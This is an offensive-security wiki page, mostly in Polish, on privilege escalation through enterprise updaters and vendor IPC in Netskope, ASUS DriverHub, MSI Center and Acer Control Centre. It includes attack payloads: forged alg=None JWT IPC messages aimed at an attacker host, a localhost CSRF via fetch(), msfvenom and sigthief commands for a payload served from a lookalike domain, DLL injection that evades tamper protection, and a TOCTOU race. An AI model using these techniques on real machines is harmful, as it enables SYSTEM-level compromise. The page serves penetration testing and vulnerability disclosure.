# Wykorzystywanie automatycznych aktualizatorów dla przedsiębiorstw i uprzywilejowanego IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ta strona uogólnia klasę łańcuchów lokalnej eskalacji uprawnień w Windows znalezionych w agentach endpoint i aktualizatorach dla przedsiębiorstw, które udostępniają powierzchnię IPC o niskim progu wejścia oraz uprzywilejowany proces aktualizacji. Reprezentatywnym przykładem jest Netskope Client for Windows < R129 (CVE-2025-0309), gdzie użytkownik o niskich uprawnieniach może wymusić rejestrację na serwerze kontrolowanym przez atakującego, a następnie dostarczyć złośliwy MSI, który instaluje usługa SYSTEM.

Kluczowe pomysły, które możesz ponownie wykorzystać przeciwko podobnym produktom:
- Wykorzystaj localhost IPC uprzywilejowanej usługi, aby wymusić ponowną rejestrację lub rekonfigurację do serwera kontrolowanego przez atakującego.
- Zaimplementuj endpointy aktualizacji dostawcy, dostarcz fałszywy Trusted Root CA i wskaż updaterowi złośliwy, „podpisany” pakiet.
- Omiń słabe kontrole podpisującego (CN allow\-lists), opcjonalne digest flags oraz luźne właściwości MSI.
- Jeśli IPC jest „szyfrowane”, wyprowadź key/IV z globalnie czytelnych identyfikatorów maszyny przechowywanych w rejestrze.
- Jeśli usługa ogranicza wywołujących według ścieżki obrazu/nazwy procesu, wstrzyknij do procesu z listy dozwolonych (allow\-listed) lub uruchom proces zawieszony i załaduj swój DLL poprzez minimalną modyfikację kontekstu wątku.

---
## 1) Wymuszanie rejestracji na serwerze atakującego przez localhost IPC

Wiele agentów dostarcza proces UI w trybie użytkownika, który komunikuje się z usługą SYSTEM przez localhost TCP używając JSON.

Zaobserwowano w Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Przebieg ataku:
1) Utwórz token rejestracyjny JWT, którego claims kontrolują host backendu (np. AddonUrl). Użyj alg=None, dzięki czemu nie jest wymagany podpis.
2) Wyślij wiadomość IPC wywołującą komendę provisioning z Twoim JWT i nazwą tenanta:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Usługa zaczyna łączyć się z twoim złośliwym serwerem w celu rejestracji/konfiguracji, np.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Uwaga:
- Jeśli weryfikacja wywołującego jest oparta na ścieżce/nazwie (path/name\-based), zainicjuj żądanie z binarki dostawcy umieszczonej na liście dozwolonych (allow\-listed) (zob. §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Gdy klient połączy się z twoim serwerem, zaimplementuj oczekiwane endpointy i przekieruj go do złośliwego MSI. Typowa sekwencja:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Zwraca certyfikat CA w formacie PEM. Usługa instaluje go w Local Machine Trusted Root store.
3) /v2/checkupdate → Dostarcza metadane wskazujące na złośliwe MSI i fałszywą wersję.

Bypassing common checks seen in the wild:
- Signer CN allow\-list: usługa może sprawdzać tylko, czy Subject CN równa się “netSkope Inc” lub “Netskope, Inc.”. Twój rogue CA może wydać certyfikat końcowy z tym CN i podpisać MSI.
- CERT_DIGEST property: dołącz nieszkodliwą właściwość MSI nazwaną CERT_DIGEST. Instalator nie egzekwuje tego podczas instalacji.
- Optional digest enforcement: flaga konfiguracyjna (np. check_msi_digest=false) wyłącza dodatkową walidację kryptograficzną.

Result: the SYSTEM service installs your MSI from
C:\ProgramData\Netskope\stAgent\data\*.msi
executing arbitrary code as NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Atakujący mogą odtworzyć szyfrowanie i wysyłać poprawne zaszyfrowane polecenia z poziomu standardowego użytkownika. Ogólna wskazówka: jeśli agent nagle „szyfruje” swoje IPC, szukaj device IDs, product GUIDs i install IDs w HKLM.

---
## 4) Bypassing IPC caller allow\-lists (path/name checks)

Niektóre usługi próbują uwierzytelnić peer poprzez rozwiązanie PID połączenia TCP i porównanie ścieżki/nazwy obrazu z allow\-listed binariami producenta znajdującymi się w Program Files (np. stagentui.exe, bwansvc.exe, epdlp.exe).

Dwa praktyczne obejścia:
- DLL injection into an allow\-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Uruchom allow\-listed binary w stanie zawieszenia i bootstrapuj swój proxy DLL bez CreateRemoteThread (zob. §5), aby spełnić reguły tamperowania wymuszane przez sterownik.

---
## 5) Tamper\-protection friendly injection: suspended process + NtContinue patch

Produkty często dostarczają minifilter/OB callbacks driver (np. Stadrv) do usuwania niebezpiecznych praw z uchwytów do chronionych procesów:
- Process: usuwa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: ogranicza do THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Niezawodny user\-mode loader, który respektuje te ograniczenia:
1) Wywołaj CreateProcess dla pliku binarnego producenta z CREATE_SUSPENDED.
2) Uzyskaj uchwyty, do których nadal masz dostęp: PROCESS_VM_WRITE | PROCESS_VM_OPERATION na procesie oraz uchwyt wątku z THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (lub tylko THREAD_RESUME, jeśli patchujesz kod pod znanym RIP).
3) Nadpisz ntdll!NtContinue (lub inny wczesny, guaranteed\-mapped thunk) małym stubem, który wywołuje LoadLibraryW na ścieżce Twojego DLL, a następnie skacze z powrotem.
4) ResumeThread, aby uruchomić stub w kontekście procesu i załadować swój DLL.

Ponieważ nigdy nie użyłeś PROCESS_CREATE_THREAD ani PROCESS_SUSPEND_RESUME na już chronionym procesie (to Ty go utworzyłeś), polityka sterownika jest spełniona.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatyzuje rogue CA, podpisywanie złośliwego MSI i serwuje wymagane endpointy: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope to custom IPC client, który tworzy dowolne (opcjonalnie AES\-encrypted) komunikaty IPC i zawiera suspended\-process injection, aby pochodzić z allow\-listed binary.

---
## 1) Browser\-to\-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub dostarcza usługę HTTP działającą w trybie użytkownika (ADU.exe) na 127.0.0.1:53000, która oczekuje wywołań z przeglądarki pochodzących z https://driverhub.asus.com. Filtr Origin po prostu wykonuje `string_contains(".asus.com")` na nagłówku Origin i na URL-ach pobierania wystawianych przez `/asus/v1.0/*`. Każdy host kontrolowany przez atakującego, taki jak `https://driverhub.asus.com.attacker.tld`, przejdzie więc ten test i będzie mógł wysyłać żądania zmieniające stan z poziomu JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Practical flow:
1) Zarejestruj domenę zawierającą `.asus.com` i umieść tam złośliwą stronę.
2) Użyj `fetch` lub XHR, aby wywołać uprzywilejowany endpoint (np. `Reboot`, `UpdateApp`) na `http://127.0.0.1:53000`.
3) Wyślij treść JSON oczekiwaną przez handler – spakowany frontend JS pokazuje schemat poniżej.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Nawet PowerShell CLI pokazany poniżej działa, gdy nagłówek Origin zostanie sfałszowany na zaufaną wartość:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1\-click (or 0\-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code\-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

Aby wykorzystać ten przepływ:
1) Stwórz payload (np. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Sklonuj podpisujący certyfikat ASUS do pliku (np. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hostuj `pwn.exe` na domenie wyglądającej jak `.asus.com` i wyzwól UpdateApp przez wspomniany powyżej CSRF w przeglądarce.

Ponieważ zarówno filtry Origin jak i URL są oparte na wyszukiwaniu podciągów, a check podpisującego porównuje tylko łańcuchy znaków, DriverHub pobiera i uruchamia złośliwy binarny plik atakującego w swoim podwyższonym kontekście.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker\-controlled arguments.

Skopiowany plik nie jest zablokowany pomiędzy weryfikacją a wywołaniem `ExecuteTask()`. Atakujący może:
- Wysłać Frame A wskazujący na legalny binarny plik podpisany przez MSI (zapewnia, że weryfikacja podpisu przejdzie i zadanie zostanie dodane do kolejki).
- Równolegle przepchać powtarzane Frame B wskazujące na złośliwy payload, nadpisując `MSI Center SDK.exe` tuż po zakończeniu weryfikacji.

Gdy harmonogram uruchomi zadanie, wykona nadpisany payload jako SYSTEM pomimo że zweryfikowano oryginalny plik. Niezawodne wykorzystanie polega na dwóch gorutinach/wątkach, które spamują CMD_AutoUpdateSDK aż do wygrania okna TOCTOU.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

Te luki IPC pokazują, dlaczego localhost services muszą wymuszać mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) i dlaczego każdy modułowy helper „run arbitrary binary” musi stosować te same weryfikacje podpisów.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)

{{#include ../../banners/hacktricks-training.md}}
